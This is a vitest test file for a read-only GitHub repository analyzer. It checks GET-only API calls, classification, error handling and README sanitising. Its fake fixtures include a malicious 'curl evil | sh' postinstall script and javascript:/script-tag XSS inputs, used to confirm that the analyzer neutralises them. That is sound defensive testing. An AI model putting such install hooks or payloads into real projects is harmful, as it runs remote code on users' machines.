import { describe, expect, it } from "vitest";
import { analyzeRepository } from "./analyzer";
import { GitHubReadOnlyClient } from "./github-client";
import { parseCompose, parsePyproject, readmeExcerpt } from "./signals";

const b64 = (s: string) => Buffer.from(s).toString("base64");
const file = (name: string, content: string) => ({ type: "file", name, path: name, size: content.length, encoding: "base64", content: b64(content) });

function fakeGitHub(routes: Record<string, unknown>) {
  const calls: { url: string; method: string }[] = [];
  const fetchImpl = async (url: string, init?: RequestInit) => {
    calls.push({ url, method: init?.method ?? "GET" });
    const path = url.replace("https://api.github.com", "");
    if (!(path in routes)) return new Response("{}", { status: 404 });
    return new Response(JSON.stringify(routes[path]), { status: 200 });
  };
  return { client: new GitHubReadOnlyClient(fetchImpl, undefined), calls };
}

const README = `# Sketchy\n\n![badge](https://img.shields.io/x)\n\nSketchy is a small web app for drawing diagrams together with your friends in real time.\n\nRun \`npm run dev\` and open http://localhost:5173\n\n<script>alert("x")</script>`;

describe("analyzeRepository", () => {
  it("analyses a web app using only GET requests to the API", async () => {
    const { client, calls } = fakeGitHub({
      "/repos/acme/sketchy": {
        full_name: "acme/sketchy",
        description: "Draw together",
        homepage: "javascript:alert(1)",
        language: "TypeScript",
        topics: ["whiteboard"],
        license: { spdx_id: "MIT" },
        owner: { login: "acme", type: "Organization" },
        default_branch: "main",
      },
      "/repos/acme/sketchy/contents": [
        { type: "file", name: "package.json", path: "package.json", size: 100 },
        { type: "file", name: "index.html", path: "index.html", size: 100 },
        { type: "dir", name: ".github", path: ".github", size: 0 },
        { type: "dir", name: "src", path: "src", size: 0 },
      ],
      "/repos/acme/sketchy/contents/package.json": file(
        "package.json",
        JSON.stringify({ name: "sketchy", scripts: { dev: "vite", postinstall: "curl evil | sh" }, dependencies: { react: "^19" }, devDependencies: { vite: "^7" } }),
      ),
      "/repos/acme/sketchy/readme": file("README.md", README),
    });

    const result = await analyzeRepository({ owner: "acme", name: "sketchy", url: "https://github.com/acme/sketchy" }, client);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const { analysis } = result;
    expect(analysis.classification).toMatchObject({ type: "web-app", status: "ready" });
    expect(analysis.metadata.homepage).toBeNull(); // unsafe URL dropped
    expect(analysis.metadata.license).toBe("MIT");
    expect(analysis.signals.readme?.excerpt).toBe("Sketchy is a small web app for drawing diagrams together with your friends in real time.");
    expect(analysis.filesRead).toEqual(expect.arrayContaining(["package.json", "README"]));
    expect(calls.every((c) => c.method === "GET" && c.url.startsWith("https://api.github.com/repos/acme/sketchy"))).toBe(true);
    // Never touches workflows.
    expect(calls.some((c) => c.url.includes("/.github"))).toBe(false);
  });

  it("returns a friendly error for missing repositories", async () => {
    const { client } = fakeGitHub({});
    const result = await analyzeRepository({ owner: "nope", name: "nothing", url: "https://github.com/nope/nothing" }, client);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("not_found");
      expect(result.error.message).toMatch(/couldn't find/);
    }
  });

  it("reports network failures without leaking details into the message", async () => {
    const client = new GitHubReadOnlyClient(async () => {
      throw new Error("ECONNREFUSED 10.0.0.1:443");
    }, undefined);
    const result = await analyzeRepository({ owner: "a", name: "b", url: "https://github.com/a/b" }, client);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("network");
      expect(result.error.message).not.toMatch(/ECONNREFUSED/);
      expect(result.error.detail).toMatch(/ECONNREFUSED/);
    }
  });
});

describe("signal parsers", () => {
  it("parses compose services", () => {
    const yaml = "version: '3'\nservices:\n  web:\n    image: x\n    ports:\n      - 80:80\n  db:\n    image: postgres\nvolumes:\n  data:\n";
    expect(parseCompose(yaml)).toEqual(["web", "db"]);
  });

  it("parses pyproject dependencies and scripts", () => {
    const toml = `[project]\nname = "x"\ndependencies = [\n  "Click>=8",\n  "rich",\n]\n\n[project.scripts]\nx = "x:main"\n`;
    expect(parsePyproject(toml)).toEqual({ deps: ["click", "rich"], hasScripts: true });
  });

  it("strips markup from README excerpts", () => {
    expect(readmeExcerpt("<p align=center><img src=x></p>\n\nThis **tool** helps [people](http://x) convert files between many formats.")).toBe(
      "This tool helps people convert files between many formats.",
    );
  });
});
